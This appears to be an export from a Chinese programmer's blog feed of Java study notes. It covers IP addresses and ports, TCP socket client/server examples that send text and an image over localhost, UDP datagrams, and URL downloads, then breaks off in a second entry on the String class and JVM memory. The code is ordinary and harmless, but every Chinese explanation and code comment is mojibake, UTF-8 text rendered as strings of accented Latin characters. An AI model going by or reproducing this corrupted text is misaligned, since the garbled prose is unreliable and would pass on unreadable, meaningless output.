‡è¯†æ­£åœ¨è®¡ç®—æœºä¸Šè¿è¡Œçš„è¿›ç¨‹ï¼ˆç¨‹åºï¼‰ ä¸åŒçš„è¿›ç¨‹æœ‰ä¸åŒçš„ç«¯å£å·è¢«è§„å®šä¸ºä¸€ä¸ª16ä½çš„æ•´æ•°0~65535ã€‚ ç«¯å£åˆ†ç±»: å…¬è®¤ç«¯å£: 0~1023ã€‚è¢«é¢„å…ˆå®šä¹‰çš„æœåŠ¡é€šä¿¡å ç”¨ï¼ˆå¦‚:HTTPå ç”¨ç«¯å£8oï¼ŒFTPå ç”¨ç«¯å£21ï¼ŒTeInetå ç”¨ç«¯å£23) æ³¨å†Œç«¯å£: 1024~49151ã€‚åˆ†é…ç»™ç”¨æˆ·è¿›ç¨‹æˆ–åº”ç”¨ç¨‹åºã€‚(å¦‚:Tomcatå ç”¨ç«¯å£8080ï¼ŒMySQLå ç”¨ç«¯å£3306ï¼ŒOracleå ç”¨ç«¯å£1521ç­‰ï¼‰ã€‚ åŠ¨æ€/ç§æœ‰ç«¯å£: 49152~65535ã€‚ ç«¯å£å·ä¸IPåœ°å€çš„ç»„åˆå¾—å‡ºä¸€ä¸ªç½‘ç»œå¥—æ¥å­—:Socketã€‚ /* * ä¸€ã€Javaä½¿ç”¨InetAddressç±»ä»£æ›¿IP * * * *ä¸‰ã€IPå’Œç«¯å£å· * 1.å®ä¾‹åŒ–InetAddressï¼šä¸¤ä¸ªæ–¹æ³•ï¼šgetByName(String host)ï¼š è·å–ipã€getLocalHost(): è·å–æœ¬æœºdip * ä¸¤ä¸ªå¸¸ç”¨æ–¹æ³•ï¼šgetHostName(): è·å–ä¸»æœºåç§°ã€getHostAddress() : è·å–ipåœ°å€ */ @Test public void test() throws UnknownHostException { //å®ä¾‹åŒ–InetAddress // getByName(String host)ï¼š è·å–ip // getLocalHost(): è·å–æœ¬æœºdip InetAddress inet1 = InetAddress.getByName("192.168.0.112"); //ip InetAddress inet2 = InetAddress.getByName("www.sina.com"); //åŸŸåæ–¹å¼ï¼Œè·å–ip InetAddress inet3 = InetAddress.getByName("127.0.0.1"); InetAddress inet4 = InetAddress.getLocalHost(); System.out.println(inet1); System.out.println(inet2); System.out.println(inet3); System.out.println(inet4); //getHostName(): è·å–ä¸»æœºåç§° System.out.println(inet2.getHostName()); //getHostAddress() : è·å–ipåœ°å€ System.out.println(inet2.getHostAddress()); } é€šä¿¡è¦ç´ 2ï¼šç½‘ç»œåè®®ç½‘ç»œé€šä¿¡åè®®:è®¡ç®—æœºç½‘ç»œä¸­å®ç°é€šä¿¡å¿…é¡»æœ‰ä¸€äº›çº¦å®šï¼Œå³é€šä¿¡åè®®ï¼Œå¯¹é€Ÿç‡ã€ä¼ è¾“ä»£ç ã€ä»£ç ç»“æ„ã€ä¼ è¾“æ§åˆ¶æ­¥éª¤ã€å‡ºé”™æ§åˆ¶ç­‰åˆ¶å®šæ ‡å‡†ã€‚ è®¡ç®—æœºç½‘ç»œé€šä¿¡æ¶‰åŠå†…å®¹å¾ˆå¤šï¼Œæ¯”å¦‚æŒ‡å®šæºåœ°å€å’Œç›®æ ‡åœ°å€ï¼ŒåŠ å¯†è§£å¯†ï¼Œå‹ç¼©è§£å‹ç¼©ï¼Œå·®é”™æ§åˆ¶ï¼Œæµé‡æ§åˆ¶ï¼Œè·¯ç”±æ§åˆ¶ï¼Œå¦‚ä½•å®ç°å¦‚æ­¤å¤æ‚çš„ç½‘ç»œåè®®å‘¢?é€šä¿¡åè®®åˆ†å±‚çš„æ€æƒ³åœ¨åˆ¶å®šåè®®æ—¶ï¼ŒæŠŠå¤æ‚æˆä»½åˆ†è§£æˆä¸€äº›ç®€å•çš„æˆä»½ï¼Œå†å°†å®ƒä»¬å¤åˆèµ·æ¥ã€‚æœ€å¸¸ç”¨çš„å¤åˆæ–¹å¼æ˜¯å±‚æ¬¡æ–¹å¼ï¼Œå³åŒå±‚é—´å¯å†é€šä¿¡ã€ä¸Šä¸€å±‚å¯ä»¥è°ƒç”¨ä¸‹ä¸€å±‚ï¼Œè€Œä¸å†ä¸‹ä¸€å±‚ä¸å‘ç”Ÿå…³ç³»ã€‚å„å±‚äº’ä¸å½±å“ï¼Œåˆ©äºç³»ç»Ÿçš„å¼€å‘å’Œæ‰©å±•ã€‚ ä¼ è¾“å±‚åè®®ä¸­æœ‰ä¸¤ä¸ªéå¸¸é‡è¦çš„åè®®: ä¼ è¾“æ§åˆ¶åè®®TCP(Transmission Control Protocol) ç”¨æˆ·æ•°æ®æŠ¥åè®®UDP(User Datagram Protocol)ã€‚ TCP/IPä»¥å…¶ä¸¤ä¸ªä¸»è¦åè®®: ä¼ è¾“æ§åˆ¶åè®®(TCP)å’Œç½‘ç»œäº’è”åè®®(IP)è€Œå¾—åï¼Œå®é™…ä¸Šæ˜¯ä¸€ç»„åè®®ï¼ŒåŒ…æ‹¬å¤šä¸ªå…·æœ‰ä¸åŒåŠŸèƒ½ä¸”äº’ä¸ºå…³è”çš„åè®®ã€‚ IP(Internet Protocol)åè®®æ˜¯ç½‘ç»œå±‚çš„ä¸»è¦åè®®ï¼Œæ”¯æŒç½‘é—´äº’è¿çš„æ•°æ®é€šä¿¡ TCP/IPåè®®æ¨¡å‹ä»æ›´å®ç”¨çš„è§’åº¦å‡ºå‘ï¼Œå½¢æˆäº†é«˜æ•ˆçš„å››å±‚ä½“ç³»ç»“æ„ï¼Œå³ç‰©ç†é“¾è·¯å±‚ã€IPå±‚ã€ä¼ è¾“å±‚å’Œåº”ç”¨å±‚ã€‚ TCPåè®®: ä½¿ç”¨TCPåè®®å‰ï¼Œé¡»å…ˆå»ºç«‹TCPè¿æ¥ï¼Œå½¢æˆä¼ è¾“æ•°æ®é€šé“ ä¼ è¾“å‰ï¼Œé‡‡ç”¨â€œä¸‰æ¬¡æ¡æ‰‹â€æ–¹å¼ï¼Œç‚¹å¯¹ç‚¹é€šä¿¡ï¼Œæ˜¯å¯é çš„ TCPåè®®è¿›è¡Œé€šä¿¡çš„ä¸¤ä¸ªåº”ç”¨è¿›ç¨‹:å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯ã€‚ åœ¨è¿æ¥ä¸­å¯è¿›è¡Œå¤§æ•°æ®é‡çš„ä¼ è¾“ ä¼ è¾“å®Œæ¯•ï¼Œéœ€é‡Šæ”¾å·²å»ºç«‹çš„è¿æ¥ï¼Œæ•ˆç‡ä½ UDPåè®®: å°†æ•°æ®ã€æºã€ç›®çš„å°è£…æˆæ•°æ®åŒ…ï¼Œä¸éœ€è¦å»ºç«‹è¿æ¥ æ¯ä¸ªæ•°æ®æŠ¥çš„å¤§å°é™åˆ¶åœ¨64Kå†… å‘é€ä¸ç®¡å¯¹æ–¹æ˜¯å¦å‡†å¤‡å¥½ï¼Œæ¥æ”¶æ–¹æ”¶åˆ°ä¹Ÿä¸ç¡®è®¤ï¼Œæ•…æ˜¯ä¸å¯é çš„ å¯ä»¥å¹¿æ’­å‘é€ å‘é€æ•°æ®ç»“æŸæ—¶æ— éœ€é‡Šæ”¾èµ„æºï¼Œå¼€é”€å°ï¼Œé€Ÿåº¦å¿« TCPç½‘ç»œç¼–ç¨‹å®ä¾‹1ï¼šå®¢æˆ·ç«¯å‘é€ä¿¡æ¯ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å°†ä¿¡æ¯æ˜¾ç¤ºåœ¨æ§åˆ¶å°ä¸Š //å®¢æˆ·ç«¯ @Test public void client(){ InetAddress inet = null; Socket socket = null; OutputStream os = null; try { //1.åˆ›å»ºsocketå¯¹è±¡ inet = InetAddress.getByName("127.0.0.1"); //è®¾ç½®æœåŠ¡ç«¯çš„ip socket = new Socket(inet, 8899); //2.è·å–è¾“å‡ºæµï¼Œç”¨äºè¾“å‡ºæ•°æ® os = socket.getOutputStream(); //3.å†™å‡ºæ•°æ®çš„æ“ä½œ os.write("ä½ å¥½ï¼Œæˆ‘æ˜¯å®¢æˆ·ç«¯mm".getBytes()); } catch (Exception e) { e.printStackTrace(); }finally { //4.å…³é—­ try { if(os != null){ os.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } } } //æœåŠ¡ç«¯ @Test public void server(){ ServerSocket ss = null; Socket socket = null; InputStream is = null; ByteArrayOutputStream baos = null; try{ //1.åˆ›å»ºæœåŠ¡å™¨ç«¯çš„ServerSocketï¼ŒæŒ‡æ˜è‡ªå·±çš„ç«¯å£å· ss = new ServerSocket(8899); //2.è°ƒç”¨accept()è¡¨ç¤ºæ¥æ”¶æ¥è‡ªäºå®¢æˆ·ç«¯çš„socket socket = ss.accept(); //3.è·å–è¾“å…¥æµ is = socket.getInputStream(); // ä¸å»ºè®®è¿™ä¹ˆå†™ï¼šå®¹æ˜“å‡ºç°ä¹±ç  // byte[] buffer = new byte[20]; // int len; // while ((len = is.read(buffer)) != -1){ // String str = new String(buffer,0, len); // System.out.println(str); // } //4.è¯»å–è¾“å…¥æµä¸­çš„æ•°æ® //ç”¨ByteArrayOutputStreamçš„å½¢å¼æ¥è¾“å‡º baos = new ByteArrayOutputStream(); byte[] buffer = new byte[5]; int len; while ((len = is.read(buffer)) != -1){ baos.write(buffer,0,len); //å†™åˆ°å†…ç½®çš„æ•°ç»„ä¸­äº† } System.out.println(baos.toString()); //æŠŠå†…éƒ¨çš„æ•°ç»„è¾“å‡ºæˆstring System.out.println("æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯ipï¼š" + socket.getInetAddress().getHostAddress() + "ä¸ªæ•°æ®"); }catch (Exception e){ e.printStackTrace(); }finally { //5.å…³é—­ try { if(baos != null){ baos.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(is != null){ is.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(ss != null){ ss.close(); } } catch (IOException e) { e.printStackTrace(); } } } å®ä¾‹2ï¼šå®¢æˆ·ç«¯å‘é€æ–‡ä»¶ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å°†æ–‡ä»¶ä¿å­˜åœ¨æœ¬åœ°ã€‚ //å®¢æˆ·ç«¯2 @Test public void client2(){ InetAddress inet = null; Socket socket = null; OutputStream os = null; FileInputStream fis = null; try { //1.åˆ›å»ºsocketå¯¹è±¡ inet = InetAddress.getByName("127.0.0.1"); //è®¾ç½®æœåŠ¡ç«¯çš„ip socket = new Socket(inet, 8899); //2.è·å–æµ os = socket.getOutputStream(); fis = new FileInputStream(new File("d:\\io\\1.png")); //3.å†™å‡ºæ•°æ®çš„æ“ä½œ byte[] buffer = new byte[1024]; int len; while ((len = fis.read(buffer)) != -1){ os.write(buffer,0,len); } } catch (Exception e) { e.printStackTrace(); }finally { //4.å…³é—­ try { if(fis != null){ fis.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(os != null){ os.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } } } //æœåŠ¡ç«¯2 @Test public void server2(){ ServerSocket ss = null; Socket socket = null; InputStream is = null; FileOutputStream fos = null; try{ //1.åˆ›å»ºæœåŠ¡å™¨ç«¯çš„ServerSocketï¼ŒæŒ‡æ˜è‡ªå·±çš„ç«¯å£å· ss = new ServerSocket(8899); //2.è°ƒç”¨accept()è¡¨ç¤ºæ¥æ”¶æ¥è‡ªäºå®¢æˆ·ç«¯çš„socket socket = ss.accept(); //3.è·å–è¾“å…¥æµ is = socket.getInputStream(); fos = new FileOutputStream(new File("d:\\io\\1_out.png")); //3.å†™å‡ºæ•°æ®çš„æ“ä½œ byte[] buffer = new byte[1024]; int len; while ((len = is.read(buffer)) != -1){ fos.write(buffer,0,len); //å†™å…¥æ–‡ä»¶æ•°æ®åˆ°æœ¬åœ° } System.out.println("æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯ipï¼š" + socket.getInetAddress().getHostAddress() + "ä¸ªæ•°æ®"); }catch (Exception e){ e.printStackTrace(); }finally { //5.å…³é—­ try { if(fos != null){ fos.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(is != null){ is.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(ss != null){ ss.close(); } } catch (IOException e) { e.printStackTrace(); } } } å®ä¾‹3ï¼šä»å®¢æˆ·ç«¯å‘é€æ–‡ä»¶ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¿å­˜åˆ°æœ¬åœ°ã€‚å¹¶è¿”å›â€œå‘é€æˆåŠŸâ€ç»™å®¢æˆ·ç«¯ã€‚å¹¶å…³é—­ç›¸åº”çš„è¿æ¥ã€‚ //å®¢æˆ·ç«¯3 @Test public void client3(){ InetAddress inet = null; Socket socket = null; OutputStream os = null; FileInputStream fis = null; InputStream is = null; ByteArrayOutputStream baos = null; try { //1.åˆ›å»ºsocketå¯¹è±¡ inet = InetAddress.getByName("127.0.0.1"); //è®¾ç½®æœåŠ¡ç«¯çš„ip socket = new Socket(inet, 8899); //2.è·å–æµ os = socket.getOutputStream(); fis = new FileInputStream(new File("d:\\io\\1.png")); //3.å†™å‡ºæ•°æ®çš„æ“ä½œ byte[] buffer = new byte[1024]; int len; while ((len = fis.read(buffer)) != -1){ os.write(buffer,0,len); } //å®¢æˆ·ç«¯å…³é—­æ•°æ®çš„è¾“å‡º socket.shutdownOutput(); //5.æ¥æ”¶æ¥è‡ªæœåŠ¡ç«¯çš„æ¶ˆæ¯ï¼Œå¹¶æ˜¾ç¤ºåˆ°ç»ˆç«¯ is = socket.getInputStream(); baos = new ByteArrayOutputStream(); byte[] buffer2 = new byte[5]; int len2; while ((len2 = is.read(buffer2)) != -1){ baos.write(buffer2,0,len2); //å†™åˆ°å†…ç½®çš„æ•°ç»„ä¸­äº† } System.out.println(baos.toString()); //æŠŠå†…éƒ¨çš„æ•°ç»„è¾“å‡ºæˆstring } catch (Exception e) { e.printStackTrace(); }finally { //6.å…³é—­ try { if(fis != null){ fis.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(os != null){ os.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(is != null){ is.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(baos != null){ baos.close(); } } catch (IOException e) { e.printStackTrace(); } } } //æœåŠ¡ç«¯3 @Test public void server3(){ ServerSocket ss = null; Socket socket = null; InputStream is = null; FileOutputStream fos = null; OutputStream os = null; try{ //1.åˆ›å»ºæœåŠ¡å™¨ç«¯çš„ServerSocketï¼ŒæŒ‡æ˜è‡ªå·±çš„ç«¯å£å· ss = new ServerSocket(8899); //2.è°ƒç”¨accept()è¡¨ç¤ºæ¥æ”¶æ¥è‡ªäºå®¢æˆ·ç«¯çš„socket socket = ss.accept(); //3.è·å–è¾“å…¥æµ is = socket.getInputStream(); fos = new FileOutputStream(new File("d:\\io\\1_out.png")); //3.å†™å‡ºæ•°æ®çš„æ“ä½œ byte[] buffer = new byte[1024]; int len; while ((len = is.read(buffer)) != -1){ fos.write(buffer,0,len); //å†™å…¥æ–‡ä»¶æ•°æ®åˆ°æœ¬åœ° } System.out.println("å›¾ç‰‡ä¼ è¾“å®Œæˆ!"); System.out.println("æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯ipï¼š" + socket.getInetAddress().getHostAddress() + "ä¸ªæ•°æ®"); //4.ç»™å®¢æˆ·ç«¯åé¦ˆ os = socket.getOutputStream(); os.write("ä½ å¥½ï¼Œç…§ç‰‡å·²æ”¶åˆ°".getBytes()); }catch (Exception e){ e.printStackTrace(); }finally { //5.å…³é—­ try { if(fos != null){ fos.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(os != null){ os.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(is != null){ is.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(ss != null){ ss.close(); } } catch (IOException e) { e.printStackTrace(); } } } UDPç½‘ç»œç¼–ç¨‹ ç±»DatagramSocketå’Œ DatagramPacketå®ç°äº†åŸºäºUDP åè®®ç½‘ç»œç¨‹åºã€‚ UDPæ•°æ®æŠ¥é€šè¿‡æ•°æ®æŠ¥å¥—æ¥å­—DatagramSocketå‘é€å’Œæ¥æ”¶ï¼Œç³»ç»Ÿä¸ä¿è¯UDPæ•°æ®æŠ¥ä¸€å®šèƒ½å¤Ÿå®‰å…¨é€åˆ°ç›®çš„åœ°ï¼Œä¹Ÿä¸èƒ½ç¡®å®šä»€ä¹ˆæ—¶å€™å¯ä»¥æŠµè¾¾ã€‚ DatagramPacketå¯¹è±¡å°è£…äº†UDPæ•°æ®æŠ¥ï¼Œåœ¨æ•°æ®æŠ¥ä¸­åŒ…å«äº†å‘é€ç«¯çš„IPåœ°å€å’Œç«¯å£å·ä»¥åŠæ¥æ”¶ç«¯çš„IPåœ°å€å’Œç«¯å£å·ã€‚ UDPåè®®ä¸­æ¯ä¸ªæ•°æ®æŠ¥éƒ½ç»™å‡ºäº†å®Œæ•´çš„åœ°å€ä¿¡æ¯ï¼Œå› æ­¤æ— é¡»å»ºç«‹å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„è¿æ¥ã€‚å¦‚åŒå‘å¿«é€’åŒ…è£¹ä¸€æ ·ã€‚ package cn.xpshuai.java1; import org.junit.Test; import java.io.IOException; import java.net.DatagramPacket; import java.net.DatagramSocket; import java.net.InetAddress; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-31 11:54 * @åŠŸèƒ½ï¼šUDPç½‘ç»œç¼–ç¨‹ * * * ä¾‹å­ï¼š * */ public class UDPTest { //å‘é€ç«¯ @Test public void send() throws IOException { DatagramSocket socket = new DatagramSocket(); String str = "æˆ‘æ˜¯UDPæ•°æ®åŒ…çš„å¤§å¯¼å¼¹"; byte[] data = str.getBytes(); InetAddress inet = InetAddress.getLocalHost(); DatagramPacket packet = new DatagramPacket(data,0,data.length,inet, 9090); socket.send(packet); socket.close(); } //æ¥æ”¶ç«¯ @Test public void receive() throws IOException{ DatagramSocket socket = new DatagramSocket(9090); //æŒ‡å®šç«¯å£å· byte[] buffer = new byte[1024]; DatagramPacket packet = new DatagramPacket(buffer,0,buffer.length); socket.receive(packet); System.out.println(new String(packet.getData(), 0, packet.getLength())); socket.close(); } } URLç¼–ç¨‹æ¦‚è¿° URL(Uniform Resource Locator): ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œå®ƒè¡¨ç¤ºInternetä¸ŠæŸä¸€èµ„æºçš„åœ°å€ã€‚ å®ƒæ˜¯ä¸€ç§å…·ä½“çš„URï¼Œå³URLå¯ä»¥ç”¨æ¥æ ‡è¯†ä¸€ä¸ªèµ„æºï¼Œè€Œä¸”è¿˜æŒ‡æ˜äº†å¦‚ä½•locateè¿™ä¸ªèµ„æºã€‚ é€šè¿‡URLæˆ‘ä»¬å¯ä»¥è®¿é—®Internetä¸Šçš„å„ç§ç½‘ç»œèµ„æºï¼Œæ¯”å¦‚æœ€å¸¸è§çš„ wwwï¼Œftpç«™ç‚¹ã€‚æµè§ˆå™¨é€šè¿‡è§£æç»™å®šçš„URLå¯ä»¥åœ¨ç½‘ç»œä¸ŠæŸ¥æ‰¾ç›¸åº”çš„æ–‡ä»¶æˆ–å…¶ä»–èµ„æºã€‚ URLçš„åŸºæœ¬ç»“æ„ç”±5éƒ¨åˆ†ç»„æˆ:&lt;ä¼ è¾“åè®®&gt;:&lt;ä¸»æœºå&gt;:&lt;ç«¯å£å·&gt;/&lt;æ–‡ä»¶å&gt;#ç‰‡æ®µå?å‚æ•°åˆ—è¡¨ ä¾‹å¦‚:http://192.168.1.100:8080/helloworld/index.jsp#a?username=shkstart&amp;password=123&gt; ç‰‡æ®µå: å³é”šç‚¹ï¼Œä¾‹å¦‚çœ‹å°è¯´ï¼Œç›´æ¥å®šä½åˆ°ç« èŠ‚ å‚æ•°åˆ—è¡¨æ ¼å¼: å‚æ•°å=å‚æ•°å€¼&amp;å‚æ•°å=å‚æ•°å€¼.... URLç±»æ„é€ å™¨ URLç±»çš„æ–¹æ³•ä¸€ä¸ªURLå¯¹è±¡ç”Ÿæˆåï¼Œå…¶å±æ€§æ˜¯ä¸èƒ½è¢«æ”¹å˜çš„ï¼Œä½†å¯ä»¥é€šè¿‡å®ƒç»™å®šçš„æ–¹æ³•æ¥è·å–è¿™äº›å±æ€§: public string getProtocol() //è·å–è¯¥URLçš„åè®®å public String getHost( ) //è·å–è¯¥URLçš„ä¸»æœºå public String getPort( ) //è·å–è¯¥URLçš„ç«¯å£å· public String getPath( ) //è·å–è¯¥URLçš„æ–‡ä»¶è·¯å¾„ public String getfile( ) //è·å–è¯¥URLçš„æ–‡ä»¶å public String getQuery( ) //è·å–è¯¥URLçš„æŸ¥è¯¢å try{ URL url = new URL("http://www.xpshuai.cn/posts/29903/#toc-heading-8"); System.out.println(url.getProtocol()); System.out.println(url.getHost()); System.out.println(url.getPort()); System.out.println(url.getPath()); System.out.println(url.getFile()); System.out.println(url.getQuery()); }catch (Exception e){ e.printStackTrace(); } ä¾‹å­ï¼šå®ç°æœåŠ¡ç«¯æ•°æ®ä¸‹è½½ //å®ç°æœåŠ¡ç«¯æ•°æ®ä¸‹è½½ @Test public void urlTest2() { HttpURLConnection urlConnection = null; InputStream is = null; FileOutputStream fos = null; try{ URL url = new URL("http://www.xpshuai.cn/medias/featureimages/15.jpg"); urlConnection = (HttpURLConnection) url.openConnection(); //çœŸæ­£çš„å»è·å– urlConnection.connect(); is = urlConnection.getInputStream(); //è·å–åˆ°è¾“å…¥æµ fos = new FileOutputStream("d:\\io\\pic.jpg"); byte[] buffer = new byte[1024]; int len; while ((len = is.read(buffer)) != -1){ fos.write(buffer, 0, len); } }catch (Exception e){ e.printStackTrace(); }finally { try { if(is != null){ is.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(fos != null){ fos.close(); } } catch (IOException e) { e.printStackTrace(); } if (urlConnection != null) { urlConnection.disconnect(); } } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>å­¦ä¹ ç¬”è®°</tag>
        <tag>ç½‘ç»œç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹å¸¸ç”¨ç±»]]></title>
    <url>%2Fposts%2F1952%2F</url>
    <content type="text"><![CDATA[Stringç±»åŸºç¡€çŸ¥è¯†Stringç±»: ä»£è¡¨å­—ç¬¦ä¸²ã€‚Javaç¨‹åºä¸­çš„æ‰€æœ‰å­—ç¬¦ä¸²å­—é¢å€¼ï¼ˆå¦‚â€abcâ€ï¼‰éƒ½ä½œä¸ºæ­¤ç±»çš„å®ä¾‹å®ç°ã€‚ Stringæ˜¯ä¸€ä¸ªfinalç±»ï¼Œä»£è¡¨ä¸å¯å˜çš„å­—ç¬¦åºåˆ—ã€‚ å­—ç¬¦ä¸²æ˜¯å¸¸é‡ï¼Œç”¨åŒå¼•å·å¼•èµ·æ¥è¡¨ç¤ºã€‚å®ƒä»¬çš„å€¼åœ¨åˆ›å»ºä¹‹åä¸èƒ½æ›´æ”¹ã€‚ Stringå¯¹è±¡çš„å­—ç¬¦å†…å®¹æ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªå­—ç¬¦æ•°ç»„value[]ä¸­çš„ã€‚ å­—ç¬¦ä¸²å¸¸é‡æ± ï¼š ä¸‰ç§JVMï¼š Sunå…¬å¸çš„HotSpotï¼ˆä½¿ç”¨çš„è¾ƒå¤šï¼‰ BEAå…¬å¸çš„JRockit IBMå…¬å¸çš„J9 VM Heap å † â€”ä¸ªJVMå®ä¾‹åªå­˜åœ¨ä¸€ä¸ªå †å†…å­˜ï¼Œå †å†…å­˜çš„å¤§å°æ˜¯å¯ä»¥è°ƒèŠ‚çš„ã€‚ç±»åŠ è½½å™¨è¯»å–äº†ç±»æ–‡ä»¶åï¼Œéœ€è¦æŠŠç±»ã€æ–¹æ³•ã€å¸¸å˜é‡æ”¾åˆ°å †å†…å­˜ä¸­ï¼Œä¿å­˜æ‰€æœ‰å¼•ç”¨ç±»å‹çš„çœŸå®ä¿¡æ¯ï¼Œä»¥æ–¹ä¾¿æ‰§è¡Œå™¨æ‰§è¡Œï¼Œå †å†…å­˜åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¸° Young Generation Spaceæ–°ç”ŸåŒº Young Tenure generation spaceå…»è€åŒº old Permanent Spaceæ°¸ä¹…å­˜å‚¨åŒº Perm äº‹å®ä¸Šæ°¸ä¹…åŒºæ˜¯åˆ’åˆ†åœ¨æ–¹æ³•åŒºçš„ï¼š æ°¸ä¹…åŒºï¼š â€‹ æ°¸ä¹…å­˜å‚¨åŒºæ˜¯ä¸€ä¸ªå¸¸é©»å†…å­˜åŒºåŸŸï¼Œç”¨äºå­˜æ”¾JDKè‡ªèº«æ‰€æºå¸¦çš„Class,Interface çš„å…ƒæ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå­˜å‚¨çš„æ˜¯è¿è¡Œç¯å¢ƒå¿…é¡»çš„ç±»ä¿¡æ¯ï¼Œè¢«è£…è½½è¿›æ­¤åŒºåŸŸçš„æ•°æ®æ˜¯ä¸ä¼šè¢«åƒåœ¾å›æ”¶å™¨å›æ”¶æ‰çš„ï¼Œå…³é—­JVMæ‰ä¼šé‡Šæ”¾æ­¤åŒºåŸŸæ‰€å ç”¨çš„å†…å­˜ã€‚â€‹ å¦‚æœå‡ºç°java.lang.OutOfMemoryError: PermGen spaceï¼Œè¯´æ˜æ˜¯Javaè™šæ‹Ÿæœºå¯¹æ°¸ä¹…ä»£Permå†…å­˜è®¾ç½®ä¸å¤Ÿã€‚ä¸€èˆ¬å‡ºç°è¿™ç§æƒ…å†µï¼Œéƒ½æ˜¯ç¨‹åºå¯åŠ¨éœ€è¦åŠ è½½å¤§é‡çš„ç¬¬ä¸‰æ–¹jaråŒ…ã€‚ä¾‹å¦‚:åœ¨ä¸€ä¸ªTomcatä¸‹éƒ¨ç½²äº†å¤ªå¤šçš„åº”ç”¨ã€‚æˆ–è€…å¤§é‡åŠ¨æ€åå°„ç”Ÿæˆçš„ç±»ä¸æ–­è¢«åŠ è½½ï¼Œæœ€ç»ˆå¯¼è‡´PermåŒºè¢«å æ»¡ã€‚Jdk1.6åŠä¹‹å‰:å¸¸é‡æ± åˆ†é…åœ¨æ°¸ä¹…ä»£, Jdk1.6åœ¨æ–¹æ³•åŒº Jdk1.7:æœ‰ï¼Œä½†å·²ç»é€æ­¥â€œå»æ°¸ä¹…ä»£â€ï¼Œ1.7åœ¨å † Jdk1.8åŠä¹‹å:æ— ï¼Œ1.8åœ¨å…ƒç©ºé—´ Stringå¯¹è±¡çš„åˆ›å»ºï¼š string str = "hello"; //æœ¬è´¨ä¸Šthis.value = new char[0]; String s1 = new String(); //this.value = original.value; String s2 = new string(String origina1); //this.value = Arrays.copyof(valueï¼Œvalue.length); string s3 = new String(char[] a); String s4 = new String(char[]a,int startIndex,int count); ä¸¤ç§åˆ›å»ºæ–¹å¼çš„åŒºåˆ«ï¼š å­—ç¬¦ä¸²çš„ç‰¹æ€§ï¼š package cn.xpshuai.java1; import org.junit.Test; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-19 10:44 * @åŠŸèƒ½ï¼šStringçš„ä½¿ç”¨ * */ public class StringTest { /** * 1.Stringå£°æ˜ä¸ºfinalï¼Œä¸å¯è¢«ç»§æ‰¿ * 2.Stringå®ç°äº†Serializableæ¥å£ï¼šè¡¨ç¤ºå­—ç¬¦ä¸²æ˜¯æ”¯æŒåºåˆ—åŒ–çš„ * å®ç°äº†Comparableæ¥å£ï¼šè¡¨ç¤ºå¯ä»¥æ¯”è¾ƒå¤§å° * 3.Stringå†…éƒ¨å®šä¹‰äº†final char[] valueç”¨äºå­˜å‚¨å­—ç¬¦æ•°æ® * 4.Stringä»£è¡¨ä¸å¯å˜çš„å­—ç¬¦åºåˆ— * ä½“ç°ï¼š * 1.å½“å¯¹å­—ç¬¦ä¸²é‡æ–°èµ‹å€¼æ—¶ï¼Œéœ€è¦é‡å†™æŒ‡å®šå†…å­˜åŒºåŸŸèµ‹å€¼ï¼Œä¸èƒ½ä½¿ç”¨åŸæœ‰çš„valueè¿›è¡Œèµ‹å€¼ã€‚ 2.å½“å¯¹ç°æœ‰çš„å­—ç¬¦ä¸²è¿›è¡Œè¿æ¥æ“ä½œæ—¶ï¼Œä¹Ÿéœ€è¦é‡æ–°æŒ‡å®šå†…å­˜åŒºåŸŸèµ‹å€¼ï¼Œä¸èƒ½ä½¿ç”¨åŸæœ‰çš„åœ°å€çš„valueè¿›è¡Œèµ‹å€¼ * 3.å½“è°ƒç”¨replace()ä¿®æ”¹å­—ç¬¦ä¸²æˆ–å­—ç¬¦æ—¶ï¼Œä¹Ÿéœ€è¦é‡æ–°æŒ‡å®šå†…å­˜åŒºåŸŸèµ‹å€¼ï¼Œä¸èƒ½ä½¿ç”¨åŸæœ‰çš„åœ°å€çš„valueè¿›è¡Œèµ‹å€¼ 